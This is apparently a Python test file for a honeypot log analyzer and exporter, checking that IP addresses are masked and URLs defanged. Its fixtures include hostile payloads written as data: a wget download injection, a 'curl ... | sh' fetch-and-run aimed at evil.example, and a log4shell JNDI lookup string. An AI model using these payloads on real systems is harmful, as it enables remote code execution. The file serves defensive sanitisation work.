"""Tests for analyze.py and export_results.py."""

from __future__ import annotations

import contextlib
import io
import json
import re
import shutil
import tempfile
import unittest
from pathlib import Path

import analyze
import export_results
from tests.helpers import ServerTestCase

FULL_IPV4 = re.compile(r"(?<!\d)\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(?!\d)")
SECRET_IPS = ["203.0.113.57", "198.51.100.23", "192.0.2.200", "2001:db8:abcd:12::5", "10.20.30.40"]


def _event(**kw: object) -> dict[str, object]:
    base: dict[str, object] = {
        "ts": "2026-11-21T10:00:00.000Z",
        "src_ip": "203.0.113.57",
        "src_port": 40000,
        "method": "GET",
        "target": "/",
        "path": "/",
        "query_raw": "",
        "headers": [["Host", "192.0.2.200"]],
        "user_agent": "Mozilla/5.0",
        "body": "",
        "body_encoding": "utf-8",
        "categories": ["unknown"],
        "status": 200,
        "flags": {"truncated": False, "rate_limited": False, "malformed": False},
    }
    base.update(kw)
    return base


EVENTS = [
    _event(),
    _event(ts="2026-11-21T10:01:10.000Z", src_ip="198.51.100.23", path="/.env",
           target="/.env", categories=["sensitive-file-probe"]),
    _event(ts="2026-11-21T10:02:00.000Z", src_ip="2001:db8:abcd:12::5", method="POST",
           path="/cgi-bin/x", query_raw="cmd=;wget+http://198.51.100.23/x.sh",
           target="/cgi-bin/x?cmd=;wget+http://198.51.100.23/x.sh",
           body="a=$(curl https://evil.example/p.sh|sh)&ip=10.20.30.40&v6=2001:db8:abcd:12::5 " + "Z" * 1000,
           categories=["command-injection", "router-iot-exploit"]),
    _event(ts="2026-11-21T10:03:00.000Z", src_ip="::ffff:192.0.2.200",
           user_agent="${jndi:ldap://203.0.113.57:1389/a}\\x1b[31m",
           categories=["log4shell"]),
    _event(ts="2026-11-21T10:04:00.000Z", method="CONNECT", path="192.0.2.200:443",
           target="192.0.2.200:443", categories=["proxy-attempt"], status=405),
    _event(ts="2026-11-21T10:05:00.000Z", body="/wD+AQ==", body_encoding="base64",
           categories=["unknown"]),
]


class ExportTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="decoy-export-"))
        logs = self.tmp / "logs"
        logs.mkdir()
        with (logs / "requests.jsonl").open("w", encoding="utf-8") as fh:
            for e in EVENTS:
                fh.write(json.dumps(e) + "\n")
            fh.write("not json\n")  # corrupt lines are skipped
        self.out = self.tmp / "results"
        with contextlib.redirect_stdout(io.StringIO()):
            export_results.main([str(logs), "--out", str(self.out), "--region", "westeurope"])

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def all_output(self) -> str:
        return "".join(p.read_text(encoding="utf-8") for p in self.out.iterdir())

    def test_no_full_ips_anywhere(self) -> None:
        text = self.all_output()
        self.assertEqual(FULL_IPV4.findall(text), [])
        for ip in SECRET_IPS:
            self.assertNotIn(ip, text)
        self.assertNotIn("abcd:12", text)

    def test_source_ips_masked(self) -> None:
        srcs = {json.loads(l)["src"] for l in (self.out / "sample.jsonl").read_text().splitlines()}
        self.assertEqual(srcs, {"203.0.x.x", "198.51.x.x", "2001:db8:x:x:x:x:x:x", "192.0.x.x"})

    def test_urls_defanged_and_truncated(self) -> None:
        text = self.all_output()
        self.assertNotRegex(text, r"(?i)https?://")
        self.assertIn("hxxp://198[.]51[.]x[.]x/x.sh", text)
        self.assertIn("hxxps://evil[.]example/p.sh", text)
        for line in (self.out / "sample.jsonl").read_text().splitlines():
            rec = json.loads(line)
            for key in ("path", "query", "body", "user_agent"):
                self.assertLessEqual(len(rec[key]), export_results.TEXT_LIMIT + 3 + 20)

    def test_no_headers_in_sample(self) -> None:
        for line in (self.out / "sample.jsonl").read_text().splitlines():
            self.assertNotIn("headers", json.loads(line))

    def test_summary(self) -> None:
        summary = json.loads((self.out / "summary.json").read_text())
        self.assertEqual(summary["session"]["region"], "westeurope")
        self.assertEqual(summary["session"]["date"], "2026-11-21")
        self.assertEqual(summary["session"]["duration_minutes"], 5.0)
        self.assertEqual(summary["totals"]["requests"], len(EVENTS))
        self.assertEqual(summary["categories"]["unknown"], 2)
        self.assertIn("requests_per_minute", summary)

    def test_exclude_ip(self) -> None:
        out = self.tmp / "filtered"
        with contextlib.redirect_stdout(io.StringIO()):
            export_results.main([str(self.tmp / "logs"), "--out", str(out),
                                 "--exclude-ip", "203.0.113.57", "--exclude-ip", "192.0.2.200"])
        summary = json.loads((out / "summary.json").read_text())
        # 3 events from 203.0.113.57 and 1 from ::ffff:192.0.2.200 (IPv4-mapped)
        self.assertEqual(summary["totals"]["requests"], len(EVENTS) - 4)
        srcs = {json.loads(l)["src"] for l in (out / "sample.jsonl").read_text().splitlines()}
        self.assertEqual(srcs, {"198.51.x.x", "2001:db8:x:x:x:x:x:x"})

    def test_mask_helpers(self) -> None:
        self.assertEqual(export_results.mask_ip("203.0.113.57"), "203.0.x.x")
        self.assertEqual(export_results.mask_ip("::ffff:192.0.2.1"), "192.0.x.x")
        self.assertEqual(export_results.mask_ip("garbage"), "x.x.x.x")
        self.assertEqual(export_results.mask_ips_in_text("at 15:36:24 ok"), "at 15:36:24 ok")
        self.assertEqual(export_results.mask_ips_in_text("x.203.0.113.5"), "x.203.0.x.x")


class AnalyzeTests(unittest.TestCase):
    def test_report_is_sanitized_and_defanged(self) -> None:
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            analyze.report(EVENTS + [_event(path="/\x1b[2J\x07x")])
        out = buf.getvalue()
        self.assertNotIn("\x1b", out)
        self.assertNotIn("\x07", out)
        self.assertNotRegex(out, r"(?i)https?://")
        for section in ("Categories", "Top paths", "Top user-agents", "Top source IPs",
                        "Requests per minute", "command-injection", "log4shell"):
            self.assertIn(section, out)

    def test_defang(self) -> None:
        self.assertEqual(analyze.defang("wget http://a.b/c.sh"), "wget hxxp://a[.]b/c.sh")
        self.assertEqual(analyze.defang("ldap://x.y:1389/a"), "ldap://x[.]y:1389/a")


class EndToEndTests(ServerTestCase):
    """Real server -> real logs -> export: still no full IPs."""

    def test_export_from_real_logs(self) -> None:
        self.get("/.env")
        self.get("/x?u=http://198.51.100.23/a", extra=b"User-Agent: curl 192.0.2.9\r\n")
        out = Path(tempfile.mkdtemp(prefix="decoy-e2e-"))
        try:
            with contextlib.redirect_stdout(io.StringIO()):
                export_results.main([str(self.log_dir), "--out", str(out)])
            text = "".join(p.read_text(encoding="utf-8") for p in out.iterdir())
            self.assertEqual(FULL_IPV4.findall(text), [])
            self.assertIn("127.0.x.x", text)
        finally:
            shutil.rmtree(out, ignore_errors=True)


if __name__ == "__main__":
    unittest.main()
